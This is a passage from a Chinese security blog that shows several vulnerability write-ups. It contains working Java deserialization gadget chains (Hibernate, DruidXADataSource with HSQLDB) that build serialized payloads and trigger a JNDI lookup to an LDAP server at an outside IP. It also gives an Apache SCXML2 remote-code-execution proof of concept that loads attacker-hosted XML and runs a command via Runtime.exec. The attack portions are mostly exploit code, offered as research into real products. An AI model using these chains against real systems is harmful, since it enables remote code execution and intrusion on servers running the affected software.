&quot;value&quot;, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, &quot;type&quot;, t);</span><br><span class="line">        return Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    static Object makeHibernate3Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        Class entityEntityModeToTuplizerMappingClass = Class.forName(&quot;com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping&quot;);</span><br><span class="line">        Class entityModeToTuplizerMappingClass = Class.forName(&quot;com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping&quot;);</span><br><span class="line">        Class typedValueClass = Class.forName(&quot;com.fr.third.org.hibernate.engine.TypedValue&quot;);</span><br><span class="line">        PojoComponentTuplizer tup = (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, &quot;getters&quot;).set(tup, getters);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, &quot;propertySpan&quot;).set(tup, 1);</span><br><span class="line">        ComponentType t = (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);</span><br><span class="line">        HashMap hm = new HashMap();</span><br><span class="line">        hm.put(EntityMode.POJO, tup);</span><br><span class="line">        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]&#123;Map.class&#125;, new Object[]&#123;hm&#125;);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;tuplizerMapping&quot;, emtm);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;propertySpan&quot;, 1);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;propertyTypes&quot;, new Type[]&#123;t&#125;);</span><br><span class="line">        Constructor&lt;?&gt; typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);</span><br><span class="line">        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v1, &quot;value&quot;, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, &quot;type&quot;, t);</span><br><span class="line">        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v2, &quot;value&quot;, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, &quot;type&quot;, t);</span><br><span class="line">        return Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String cmd = &quot;class_file:/Users/1.class&quot;;</span><br><span class="line">        ObjectPayload&lt;?&gt; payload = (ObjectPayload) fr10chnel.class.newInstance();</span><br><span class="line">        Object objBefore = payload.getObject(cmd);</span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(bao);</span><br><span class="line">        out.writeObject(objBefore);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        com.fr.third.org.apache.commons.io.FileUtils.writeByteArrayToFile(new File(&quot;/Users/hello2.ser&quot;), bao.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>步骤2，将生成的hello2.ser利用jndi工具加载自定义序列化文件，生成jackson.ser</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class channel_deser_Hsql_jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String jndiuri = &quot;ldap://10.92.66.92:1389/Deserialization/CustomDeserialize/L1VzZXJzL2t1YWlsZS9oZWxsbzIuc2Vy&quot;;</span><br><span class="line">        String call = &quot;call\&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;&quot; + jndiuri + &quot;&#x27;);&quot;;</span><br><span class="line">        DruidXADataSource druidXADataSource = new DruidXADataSource();</span><br><span class="line">        ArrayList&lt;DruidXADataSource&gt; list_3 = new ArrayList&lt;DruidXADataSource&gt;(Arrays.asList(druidXADataSource));</span><br><span class="line">        ArrayList&lt;List&gt; list_1 = new ArrayList&lt;List&gt;(Arrays.asList(list_3));</span><br><span class="line">        ArrayList&lt;String&gt; list_2 = new ArrayList&lt;String&gt;(Arrays.asList(&quot;1&quot;));</span><br><span class="line">        JSONArray jsonArray_1 = new JSONArray(list_1);</span><br><span class="line">        JSONArray jsonArray_2 = new JSONArray(list_2);</span><br><span class="line">        Class&lt;?&gt; clazz2 = Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);    //javax.swing.UIDefaults$TextAndMnemonicHashMap.get(key)    -&gt; key.toString</span><br><span class="line">        Constructor&lt;?&gt; t_constructor = clazz2.getDeclaredConstructor();</span><br><span class="line">        t_constructor.setAccessible(true);</span><br><span class="line">        Object textAndMnemonicHashMap_1 = t_constructor.newInstance(new Object[0]);</span><br><span class="line">        Object textAndMnemonicHashMap_2 = t_constructor.newInstance(new Object[0]);</span><br><span class="line">        Method putmethod = Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;).getSuperclass().getDeclaredMethod(&quot;put&quot;, Object.class, Object.class);</span><br><span class="line">        putmethod.setAccessible(true);</span><br><span class="line">        putmethod.invoke(textAndMnemonicHashMap_1, jsonArray_1, 11);</span><br><span class="line">        putmethod.invoke(textAndMnemonicHashMap_2, jsonArray_2, jsonArray_2);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;statLogger&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;logWriter&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;transactionHistogram&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;initedLatch&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;initialSize&quot;, 1);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;jdbcUrl&quot;, &quot;jdbc:hsqldb:mem:test&quot;);</span><br><span class="line">        Reflections.setFieldValue(druidXADataSource, &quot;validationQuery&quot;, call);</span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap_1, 1);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap_2, 1);</span><br><span class="line">        putmethod.invoke(textAndMnemonicHashMap_1, jsonArray_1, jsonArray_1);</span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span><br><span class="line">        GZIPOutputStream gzout = new GZIPOutputStream(bao);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(gzout);</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        gzout.close();</span><br><span class="line">        FileUtils.writeByteArrayToFile(new File(&quot;jackson.ser&quot;), bao.toByteArray());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="druidXADataSourceGadget-不出网利用链"><a href="#druidXADataSourceGadget-不出网利用链" class="headerlink" title="druidXADataSourceGadget-不出网利用链"></a>druidXADataSourceGadget-不出网利用链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二次反序列化点：</span><br><span class="line">com/fr/third/springframework/util/SerializationUtils.class</span><br><span class="line">org/terracotta/modules/ehcache/collections/SerializationHelper.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public byte[] druidXADataSourceExp(String path) throws Exception&#123;</span><br><span class="line">    HibernateGadget2nogzip hibernateGadget2nogzip = new HibernateGadget2nogzip();</span><br><span class="line">    String payload = Hex.encodeHexString(hibernateGadget2nogzip.HibernateGadgetEXP(path));</span><br><span class="line">    String call = &quot;CALL \&quot;org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\&quot;(x&#x27;&quot; + payload + &quot;&#x27;);&quot;;</span><br><span class="line">    DruidXADataSource druidXADataSource = new DruidXADataSource();</span><br><span class="line">    ArrayList&lt;DruidXADataSource&gt; list_3 = new ArrayList&lt;DruidXADataSource&gt;(Arrays.asList(druidXADataSource));</span><br><span class="line">    ArrayList&lt;List&gt; list_1 = new ArrayList&lt;List&gt;(Arrays.asList(list_3));</span><br><span class="line">    ArrayList&lt;String&gt; list_2 = new ArrayList&lt;String&gt;(Arrays.asList(&quot;1&quot;));</span><br><span class="line">    JSONArray jsonArray_1 = new JSONArray(list_1);</span><br><span class="line">    JSONArray jsonArray_2 = new JSONArray(list_2);</span><br><span class="line">    Class&lt;?&gt; clazz2 = Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);    //javax.swing.UIDefaults$TextAndMnemonicHashMap.get(key)    -&gt; key.toString</span><br><span class="line">    Constructor&lt;?&gt; t_constructor = clazz2.getDeclaredConstructor();</span><br><span class="line">    t_constructor.setAccessible(true);</span><br><span class="line">    Object textAndMnemonicHashMap_1 = t_constructor.newInstance(new Object[0]);</span><br><span class="line">    Object textAndMnemonicHashMap_2 = t_constructor.newInstance(new Object[0]);</span><br><span class="line">    Method putmethod = Class.forName(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;).getSuperclass().getDeclaredMethod(&quot;put&quot;, Object.class, Object.class);</span><br><span class="line">    putmethod.setAccessible(true);</span><br><span class="line">    putmethod.invoke(textAndMnemonicHashMap_1, jsonArray_1, 11);</span><br><span class="line">    putmethod.invoke(textAndMnemonicHashMap_2, jsonArray_2, jsonArray_2);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;statLogger&quot;, null);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;logWriter&quot;, null);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;transactionHistogram&quot;, null);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;initedLatch&quot;, null);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;initialSize&quot;, 1);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;jdbcUrl&quot;, &quot;jdbc:hsqldb:mem:test&quot;);</span><br><span class="line">    SetFieldValue.setFieldValue(druidXADataSource, &quot;validationQuery&quot;, call);</span><br><span class="line">    Hashtable hashtable = new Hashtable();</span><br><span class="line">    hashtable.put(textAndMnemonicHashMap_1, 1);</span><br><span class="line">    hashtable.put(textAndMnemonicHashMap_2, 1);</span><br><span class="line">    putmethod.invoke(textAndMnemonicHashMap_1, jsonArray_1, jsonArray_1);</span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">    GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);</span><br><span class="line">    ObjectOutputStream objectOutputStream = new ObjectOutputStream(gzipOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(hashtable);</span><br><span class="line">    gzipOutputStream.close();</span><br><span class="line">    return byteArrayOutputStream.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/19/%E4%BA%BF%E8%B5%9B%E9%80%9A%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/19/%E4%BA%BF%E8%B5%9B%E9%80%9A%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/" class="post-title-link" itemprop="url">亿赛通历史漏洞浅析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-12-19 00:37:32" itemprop="dateCreated datePublished" datetime="2023-12-19T00:37:32+08:00">2023-12-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-10 00:58:05" itemprop="dateModified" datetime="2024-03-10T00:58:05+08:00">2024-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析了亿赛通最近爆出的文件上传、xstream、token伪造反序列化等漏洞，通过挖掘发现该系统还存在许多伪造cookie的漏洞，可根据文中历史漏洞进行挖掘
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/12/19/%E4%BA%BF%E8%B5%9B%E9%80%9A%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">apache scxml2 远程代码执行</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-07 13:29:21" itemprop="dateCreated datePublished" datetime="2023-02-07T13:29:21+08:00">2023-02-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-02-17 13:33:13" itemprop="dateModified" datetime="2025-02-17T13:33:13+08:00">2025-02-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
<li>这是一个远程加载xml文件的jexl表达式代码执行漏洞</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先分析SCXMLReader这个类，该方法有许多read方法的重载，有直接传入InputStream和String URl等等</p>
<p><img src="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/image-20230213142745-re2g3br.png" alt="image"></p>
<p>我们来看传入InPutStream的这个方法，【1】传入scxmlStream会调用read方法，在[3]出会调用readInternal进行进一步解析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SCXML <span class="title function_">read</span><span class="params">(InputStream scxmlStream)</span> <span class="keyword">throws</span> IOException, ModelException, XMLStreamException &#123;</span><br><span class="line">    <span class="keyword">return</span> read(scxmlStream, <span class="keyword">new</span> <span class="title class_">Configuration</span>()); 【<span class="number">1</span>】</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SCXML <span class="title function_">read</span><span class="params">(InputStream scxmlStream, Configuration configuration)</span> <span class="keyword">throws</span> IOException, ModelException, XMLStreamException &#123;</span><br><span class="line">    <span class="keyword">if</span> (scxmlStream == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Cannot parse null InputStream&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     【<span class="number">3</span>】<span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> readInternal(configuration, (URL)<span class="literal">null</span>, (String)<span class="literal">null</span>, scxmlStream, (Reader)<span class="literal">null</span>, (Source)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (scxml != <span class="literal">null</span>) &#123;</span><br><span class="line">            ModelUpdater.updateSCXML(scxml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> scxml;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在readInternal方法中前面两个if语句都是为false(如果我们最开始是通过重载的传入的参数是url对象的时候，这里就会进入第二个if语句中)，直接跟如getReader中</p>
<p><img src="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/image-20230213143042-q9i4c15.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境搭建如下，因为aliyunmaven 目前并没有scxml2的依赖，所以我是本地导入的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-scxml2&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">2.0</span>&lt;/version&gt;</span><br><span class="line">  &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">  &lt;systemPath&gt;/Users/Downloads/commons-scxml2-<span class="number">2.0</span>-SNAPSHOT.jar&lt;/systemPath&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-jexl&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">2.1</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 执行 scxml 实例的引擎</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// 将 SCXML URL 解析为 SCXML 模型</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://172.16.132.228:8081/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置状态机（scxml 实例）执行</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.util.StreamUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> BUFFER_LENGTH=<span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/kuaile/idea_code/Apache_SCXML_Rce2/src/test/poc.xml&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(in);</span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.xml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt; </span><br><span class="line">&lt;scxml xmlns=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> version=<span class="string">&quot;1.0&quot;</span> initial=<span class="string">&quot;r1un&quot;</span>&gt; </span><br><span class="line">&lt;state id=<span class="string">&quot;r1un&quot;</span>&gt; </span><br><span class="line">&lt;onentry&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line"><span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;open -a calculator&quot;);&#x27;</span>)</span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/onentry&gt; </span><br><span class="line">&lt;/state&gt; </span><br><span class="line">&lt;/scxml&gt;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/26/%E9%87%91%E8%9D%B6%E5%A4%A9%E7%87%95%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
